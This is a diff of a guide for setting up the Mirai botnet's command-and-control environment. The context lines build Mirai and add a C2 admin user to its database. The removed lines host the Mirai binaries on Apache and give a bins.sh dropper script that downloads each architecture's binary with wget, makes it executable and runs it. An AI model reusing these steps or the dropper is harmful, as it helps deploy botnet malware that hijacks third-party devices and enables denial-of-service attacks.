@@ -48,7 +48,7 @@ https://programmer.group/mirai-botnet-environment-setup-steps.html
 Add users to mysql.
 ```
 # cat db.sql | mysql -uroot -proot
-# mysql -uroot -proot mirai
+# mysql -uroot -proot
 > INSERT INTO users VALUES (NULL, 'anna-senpai', 'myawesomepassword', 0, 0, 0, 0, -1, 1, 30, '');
 > exit
 # service mysql restart
@@ -102,36 +102,6 @@ In mirai folder, run build.sh script
 # cp ../prompt.txt debug
 # cp ../prompt.txt release
 # cd /release
-```
-Install Apache2 server.
-```
-# sudo apt-get install apache2 -y
-# service apache2 start
-# cp mirai.* /var/www/html
-# cd /var/www/html
-# rm -fr /var/www/html/index.html
-```
-Check by entering localhost in a browser such as Fireforx.
-
-When you have finished checking, copy and paste the following code and save it as bins.sh.
-```
-#!/bin/sh
-
-# Edit
-WEBSERVER="localhost:80"
-# Stop editing now 
-
-BINARIES="mirai.arm mirai.m68k miraint.x86 miraint.spc miraint.sh4 miraint.ppc miraint.mpsl miraint.mips miraint.arm7 miraint.arm5n miraint.arm"
-
-for Binary in $BINARIES; do
-    wget http://$WEBSERVER/$Binary -O dvrHelper
-    chmod 777 dvrHelper
-    ./dvrHelper
-done
-```
-Restart Apache2 after saving bins.sh
-```
-# service apache2 restart
 ```
 Build loader
 ```
